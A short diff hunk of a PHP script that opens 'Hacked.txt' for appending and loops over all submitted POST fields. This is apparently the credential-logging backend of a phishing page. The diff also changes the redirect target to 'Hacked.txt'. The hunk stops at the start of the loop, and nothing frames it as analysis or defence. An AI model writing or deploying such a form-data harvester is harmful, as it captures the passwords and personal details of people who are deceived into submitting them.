@@ -1,6 +1,6 @@
 <?php
 header
-('location:');
+('location:Hacked.txt');
 $handle=fopen("Hacked.txt","a");
 foreach($_POST as $variable=>$value)
 {
